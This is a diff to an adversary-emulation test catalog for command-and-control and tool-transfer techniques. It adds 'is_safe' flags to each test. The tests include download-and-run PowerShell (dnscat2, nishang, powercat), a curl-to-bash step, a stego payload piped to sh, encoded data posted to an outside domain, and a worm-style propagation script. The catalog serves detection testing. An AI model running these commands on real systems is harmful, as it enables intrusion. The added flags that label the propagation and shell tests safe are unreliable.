@@ -20,6 +20,7 @@
         Remove-Item -Path "$env:PUBLIC\Downloads\T1001.002New.jpg" -Force -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Embedded Script in Image Execution via Extract-Invoke-PSImage
       type: powershell
       platform: windows
@@ -27,15 +28,17 @@
       cleanup: "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Execute Embedded Script in Image via Steganography
       type: sh
       platform: linux
       command: cat "PathToAtomicsFolder/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "PathToAtomicsFolder/image.jpg" - > "PathToAtomicsFolder/evil_image.jpg"; strings "PathToAtomicsFolder/evil_image.jpg" | tail -n 1 | base64 -d | sh
       cleanup: rm "PathToAtomicsFolder/evil_image.jpg"
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1001/002
-  is_safe: false
+  is_safe: true
 - id: T1071
   name: Application Layer Protocol
   description: "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enc..."
@@ -50,9 +53,10 @@
       platform: windows
       command: PathToAtomicsFolder\T1071\bin\telnet_client.exe 127.0.0.1 --port 23
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1071
-  is_safe: false
+  is_safe: true
 - id: T1071.001
   name: Web Protocols
   description: "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have ..."
@@ -71,6 +75,7 @@
         Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
         Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null
       timeout: 120
+      is_safe: true
     - name: Malicious User Agents - CMD
       type: cmd
       platform: windows
@@ -80,6 +85,7 @@
         C:\Windows\System32\Curl.exe -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com >nul 2>&1
         C:\Windows\System32\Curl.exe -s -A "*<|>*" -m3 www.google.com >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Malicious User Agents - Nix
       type: sh
       platform: linux
@@ -89,6 +95,7 @@
         curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
         curl -s -A "*<|>*" -m3 www.google.com
       timeout: 60
+      is_safe: true
     - name: Malicious User Agents - Nix
       type: sh
       platform: macos
@@ -98,9 +105,10 @@
         curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
         curl -s -A "*<|>*" -m3 www.google.com
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1071/001
-  is_safe: false
+  is_safe: true
 - id: T1071.004
   name: DNS
   description: "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication..."
@@ -115,6 +123,7 @@
       platform: windows
       command: for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type "TXT" "atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io" -QuickTimeout}
       timeout: 120
+      is_safe: true
     - name: DNS Regular Beaconing
       type: powershell
       platform: windows
@@ -122,6 +131,7 @@
         Set-Location "PathToAtomicsFolder"
         .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30
       timeout: 120
+      is_safe: true
     - name: DNS Long Domain Query
       type: powershell
       platform: windows
@@ -129,6 +139,7 @@
         Set-Location "PathToAtomicsFolder"
         .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT
       timeout: 120
+      is_safe: true
     - name: DNS C2
       type: powershell
       platform: windows
@@ -136,9 +147,10 @@
         IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
         Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1071/004
-  is_safe: false
+  is_safe: true
 - id: T1090.001
   name: Internal Proxy
   description: 'Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbou...'
@@ -158,6 +170,7 @@
         unset http_proxy
         [ "false" == "true" ] && (kill -9 $(ps aux | grep "squid -N" | grep -v "grep" | awk '{print $2}'))
       timeout: 60
+      is_safe: true
     - name: Connection Proxy
       type: sh
       platform: macos
@@ -168,6 +181,7 @@
         unset http_proxy
         [ "false" == "true" ] && (kill -9 $(ps aux | grep "squid -N" | grep -v "grep" | awk '{print $2}'))
       timeout: 60
+      is_safe: true
     - name: Connection Proxy for macOS UI
       type: sh
       platform: macos
@@ -178,6 +192,7 @@
         networksetup -setwebproxystate Wi-Fi off
         networksetup -setsecurewebproxystate Wi-Fi off
       timeout: 60
+      is_safe: true
     - name: portproxy reg key
       type: powershell
       platform: windows
@@ -185,9 +200,10 @@
       cleanup: netsh interface portproxy delete v4tov4 listenport=1337 -ErrorAction Ignore | Out-Null
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1090/001
-  is_safe: false
+  is_safe: true
 - id: T1090.003
   name: Multi-hop Proxy
   description: |-
@@ -205,6 +221,7 @@
       command: '& "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"'
       cleanup: "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}"
       timeout: 120
+      is_safe: true
     - name: Tor Proxy Usage - Windows
       type: powershell
       platform: windows
@@ -213,6 +230,7 @@
         sleep -s 60
         stop-process -name "tor" | out-null
       timeout: 120
+      is_safe: true
     - name: Tor Proxy Usage - Debian/Ubuntu/FreeBSD
       type: sh
       platform: linux
@@ -220,15 +238,17 @@
       cleanup: '[ "$(uname)" = ''FreeBSD'' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor'
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Tor Proxy Usage - MacOS
       type: sh
       platform: macos
       command: osascript -e 'tell application "Terminal" to do script "tor"'
       cleanup: killall tor > /dev/null 2>&1
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1090/003
-  is_safe: false
+  is_safe: true
 - id: T1095
   name: Non-Application Layer Protocol
   description: 'Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such a...'
@@ -245,11 +265,13 @@
         IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
         Invoke-PowerShellIcmp -IPAddress 127.0.0.1
       timeout: 120
+      is_safe: true
     - name: Netcat C2
       type: powershell
       platform: windows
       command: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe" 127.0.0.1 80
       timeout: 120
+      is_safe: true
     - name: Powercat C2
       type: powershell
       platform: windows
@@ -257,9 +279,10 @@
         IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
         powercat -c 127.0.0.1 -p 80
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1095
-  is_safe: false
+  is_safe: true
 - id: T1105
   name: Ingress Tool Transfer
   description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniq...
@@ -275,68 +298,81 @@
       command: rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: rsync remote file copy (push)
       type: sh
       platform: macos
       command: rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: rsync remote file copy (pull)
       type: sh
       platform: linux
       command: rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files
       timeout: 60
+      is_safe: true
     - name: rsync remote file copy (pull)
       type: sh
       platform: macos
       command: rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files
       timeout: 60
+      is_safe: true
     - name: scp remote file copy (push)
       type: sh
       platform: linux
       command: scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
       timeout: 60
+      is_safe: true
     - name: scp remote file copy (push)
       type: sh
       platform: macos
       command: scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
       timeout: 60
+      is_safe: true
     - name: scp remote file copy (pull)
       type: sh
       platform: linux
       command: scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
       timeout: 60
+      is_safe: true
     - name: scp remote file copy (pull)
       type: sh
       platform: macos
       command: scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
       timeout: 60
+      is_safe: true
     - name: sftp remote file copy (push)
       type: bash
       platform: linux
       command: sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
       timeout: 60
+      is_safe: true
     - name: sftp remote file copy (push)
       type: bash
       platform: macos
       command: sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
       timeout: 60
+      is_safe: true
     - name: sftp remote file copy (pull)
       type: sh
       platform: linux
       command: sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
       timeout: 60
+      is_safe: true
     - name: sftp remote file copy (pull)
       type: sh
       platform: macos
       command: sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
       timeout: 60
+      is_safe: true
     - name: certutil download (urlcache)
       type: cmd
       platform: windows
       command: cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
       cleanup: del Atomic-license.txt >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: certutil download (verifyctl)
       type: powershell
       platform: windows
@@ -348,17 +384,20 @@
         Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
       cleanup: Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Windows - BITSAdmin BITS Download
       type: cmd
       platform: windows
       command: C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
       timeout: 120
+      is_safe: true
     - name: Windows - PowerShell Download
       type: powershell
       platform: windows
       command: (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "$env:TEMP\Atomic-license.txt")
       cleanup: Remove-Item $env:TEMP\Atomic-license.txt -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: OSTAP Worming Activity
       type: cmd
       platform: windows
@@ -371,6 +410,7 @@
         popd
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: svchost writing a file to a UNC path
       type: cmd
       platform: windows
@@ -382,6 +422,7 @@
         del C:\\svchost.exe >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Download a File with Windows Defender MpCmdRun.exe
       type: cmd
       platform: windows
@@ -392,28 +433,33 @@
         del %temp%\Atomic-license.txt >nul 2>&1
         del %temp%\MpCmdRun.log >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: whois file download
       type: sh
       platform: linux
       command: timeout --preserve-status 1 whois -h localhost -p 8443 "Hello from Atomic Red Team test T1105" > /tmp/T1105.whois.out
       cleanup: rm -f /tmp/T1105.whois.out
       timeout: 60
+      is_safe: true
     - name: whois file download
       type: sh
       platform: macos
       command: timeout --preserve-status 1 whois -h localhost -p 8443 "Hello from Atomic Red Team test T1105" > /tmp/T1105.whois.out
       cleanup: rm -f /tmp/T1105.whois.out
       timeout: 60
+      is_safe: true
     - name: File Download via PowerShell
       type: powershell
       platform: windows
       command: (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt
       timeout: 120
+      is_safe: true
     - name: File download with finger.exe on Windows
       type: cmd
       platform: windows
       command: finger base64_filedata@localhost
       timeout: 120
+      is_safe: true
     - name: Download a file with IMEWDBLD.exe
       type: powershell
       platform: windows
@@ -422,6 +468,7 @@
         & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
       cleanup: "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }"
       timeout: 120
+      is_safe: true
     - name: Curl Download File
       type: cmd
       platform: windows
@@ -436,6 +483,7 @@
         del c:\programdata\allthethingsx64.dll >nul 2>&1
         del %Temp%\allthethingsx64.dll >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Curl Upload File
       type: cmd
       platform: windows
@@ -445,6 +493,7 @@
         C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com
         C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
       timeout: 120
+      is_safe: true
     - name: Download a file with Microsoft Connection Manager Auto-Download
       type: cmd
       platform: windows
@@ -453,18 +502,21 @@
         del /f/s/q %temp%\T1105 >nul 2>&1
         rmdir /s/q %temp%\T1105 >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: MAZE Propagation Script
       type: powershell
       platform: windows
       command: "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}\nelse\n{echo $machine >> \"$offline_list\"}}"
       cleanup: "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue"
       timeout: 120
+      is_safe: true
     - name: Printer Migration Command-Line Tool UNC share folder into a zip file
       type: cmd
       platform: windows
       command: "del %TEMP%\\PrintBrm.zip >nul 2>&1 \nC:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE"
       cleanup: del %TEMP%\PrintBrm.zip >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Lolbas replace.exe use to copy file
       type: cmd
       platform: windows
@@ -473,6 +525,7 @@
         C:\Windows\System32\replace.exe "PathToAtomicsFolder\T1105\src\redcanary.cab" %TEMP% /A
       cleanup: del %TEMP%\redcanary.cab >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Lolbas replace.exe use to copy UNC file
       type: cmd
       platform: windows
@@ -481,30 +534,35 @@
         C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A
       cleanup: del %TEMP%\redcanary.cab >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: certreq download
       type: cmd
       platform: windows
       command: certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt
       cleanup: del %temp%\Atomic-license.txt >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Download a file using wscript
       type: cmd
       platform: windows
       command: wscript.exe "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs"
       cleanup: del Atomic-License.txt >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Linux Download File and Run
       type: sh
       platform: linux
       command: curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh
       cleanup: rm atomic.sh
       timeout: 60
+      is_safe: true
     - name: Nimgrab - Transfer Files
       type: cmd
       platform: windows
       command: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\Atomic-license.txt
       cleanup: del $env:TEMP\Atomic-license.txt >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: iwr or Invoke Web-Request download
       type: cmd
       platform: windows
@@ -512,6 +570,7 @@
       cleanup: del %temp%\Atomic-license.txt >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Arbitrary file download using the Notepad++ GUP.exe binary
       type: cmd
       platform: windows
@@ -522,12 +581,14 @@
       cleanup: rmdir /s /q "C:\Temp\Sample" >nul 2>nul
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: File download via nscurl
       type: sh
       platform: macos
       command: nscurl -k "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -o "license.txt"
       cleanup: rm "license.txt"
       timeout: 60
+      is_safe: true
     - name: File Download with Sqlcmd.exe
       type: powershell
       platform: windows
@@ -535,6 +596,7 @@
       cleanup: rm "C:\T1105.zip" 2>$null | Out-Null
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Remote File Copy using PSCP
       type: cmd
       platform: windows
@@ -543,6 +605,7 @@
         echo y | PathToAtomicsFolder\..\ExternalPayloads\pscp.exe -P 22 -pw atomic C:\Temp\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip
       cleanup: del /f /q C:\Temp\T1105_scp.zip
       timeout: 120
+      is_safe: true
     - name: Windows push file using scp.exe
       type: powershell
       platform: windows
@@ -566,12 +629,14 @@
         Write-Output "File deleted: $filePath"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows pull file using scp.exe
       type: powershell
       platform: windows
       command: scp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows push file using sftp.exe
       type: powershell
       platform: windows
@@ -593,12 +658,14 @@
         Write-Output "File deleted: $filePath"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Windows pull file using sftp.exe
       type: powershell
       platform: windows
       command: sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Download a file with OneDrive Standalone Updater
       type: powershell
       platform: windows
@@ -620,9 +687,10 @@
         Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force -ErrorAction Ignore
         Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1105
-  is_safe: false
+  is_safe: true
 - id: T1132.001
   name: Standard Encoding
   description: 'Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in dat...'
@@ -639,6 +707,7 @@
         echo -n 111-11-1111 | base64
         curl -XPOST MTExLTExLTExMTE=.redcanary.com
       timeout: 60
+      is_safe: true
     - name: Base64 Encoded data.
       type: sh
       platform: linux
@@ -646,6 +715,7 @@
         echo -n 111-11-1111 | base64
         curl -XPOST MTExLTExLTExMTE=.redcanary.com
       timeout: 60
+      is_safe: true
     - name: Base64 Encoded data (freebsd)
       type: sh
       platform: linux
@@ -653,6 +723,7 @@
         echo -n 111-11-1111 | b64encode -r -
         curl -XPOST MTExLTExLTExMTE=.redcanary.com
       timeout: 60
+      is_safe: true
     - name: XOR Encoded data.
       type: powershell
       platform: windows
@@ -667,9 +738,10 @@
         [System.Net.ServicePointManager]::Expect100Continue = $false
         Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1132/001
-  is_safe: false
+  is_safe: true
 - id: T1219
   name: Remote Access Tools
   description: An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line int...
@@ -690,6 +762,7 @@
         Remove-Item $file1 -ErrorAction Ignore | Out-Null
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: AnyDesk Files Detected Test on Windows
       type: powershell
       platform: windows
@@ -702,6 +775,7 @@
         Remove-Item $file1 -ErrorAction Ignore
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: LogMeIn Files Detected Test on Windows
       type: powershell
       platform: windows
@@ -713,6 +787,7 @@
       cleanup: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: GoToAssist Files Detected Test on Windows
       type: powershell
       platform: windows
@@ -723,6 +798,7 @@
       cleanup: try{"$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1"} catch{}
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: ScreenConnect Application Download and Install on Windows
       type: powershell
       platform: windows
@@ -735,6 +811,7 @@
         msiexec /x $installer /qn
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Ammyy Admin Software Execution
       type: powershell
       platform: windows
@@ -742,6 +819,7 @@
       cleanup: Stop-Process -Name "Ammyy" -force -erroraction silentlycontinue
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: RemotePC Software Execution
       type: powershell
       platform: windows
@@ -749,6 +827,7 @@
       cleanup: "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: NetSupport - RAT Execution
       type: powershell
       platform: windows
@@ -756,6 +835,7 @@
       cleanup: Stop-Process -Name "client32" -force -erroraction silentlycontinue
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: UltraViewer - RAT Execution
       type: powershell
       platform: windows
@@ -765,6 +845,7 @@
       cleanup: Stop-Process -Name "UltraViewer_Desktop" -Force -ErrorAction SilentlyContinue
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: UltraVNC Execution
       type: powershell
       platform: windows
@@ -772,6 +853,7 @@
       cleanup: Stop-Process -Name "vncviewer" -force -erroraction silentlycontinue
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: MSP360 Connect Execution
       type: powershell
       platform: windows
@@ -779,6 +861,7 @@
       cleanup: Stop-Process -Name "Connect" -force -erroraction silentlycontinue
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: RustDesk Files Detected Test on Windows
       type: powershell
       platform: windows
@@ -790,6 +873,7 @@
         $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
         Remove-Item $file1 -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Splashtop Execution
       type: powershell
       platform: windows
@@ -797,12 +881,14 @@
       cleanup: Stop-Process -Name "strwinclt" -force -erroraction silentlycontinue
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Splashtop Streamer Execution
       type: powershell
       platform: windows
       command: Start-Process -FilePath "C:Program Files (x86)\Splashtop\Splashtop Remote\Server\SRServer.exe"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Microsoft App Quick Assist Execution
       type: powershell
       platform: windows
@@ -810,9 +896,10 @@
       cleanup: Stop-Process -Name quickassist
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1219
-  is_safe: false
+  is_safe: true
 - id: T1571
   name: Non-Standard Port
   description: |-
@@ -830,6 +917,7 @@
       platform: windows
       command: Test-NetConnection -ComputerName google.com -port 8081
       timeout: 120
+      is_safe: true
     - name: Testing usage of uncommonly used port
       type: sh
       platform: linux
@@ -837,6 +925,7 @@
         echo quit | telnet google.com 8081
         exit 0
       timeout: 60
+      is_safe: true
     - name: Testing usage of uncommonly used port
       type: sh
       platform: macos
@@ -844,9 +933,10 @@
         echo quit | telnet google.com 8081
         exit 0
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1571
-  is_safe: false
+  is_safe: true
 - id: T1572
   name: Protocol Tunneling
   description: Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their...
@@ -861,6 +951,7 @@
       platform: windows
       command: for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest "https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT" -UseBasicParsing).Content }
       timeout: 120
+      is_safe: true
     - name: DNS over HTTPS Regular Beaconing
       type: powershell
       platform: windows
@@ -868,6 +959,7 @@
         Set-Location "PathToAtomicsFolder"
         .\T1572\src\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30
       timeout: 120
+      is_safe: true
     - name: DNS over HTTPS Long Domain Query
       type: powershell
       platform: windows
@@ -875,6 +967,7 @@
         Set-Location "PathToAtomicsFolder"
         .\T1572\src\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT
       timeout: 120
+      is_safe: true
     - name: run ngrok
       type: powershell
       platform: windows
@@ -884,6 +977,7 @@
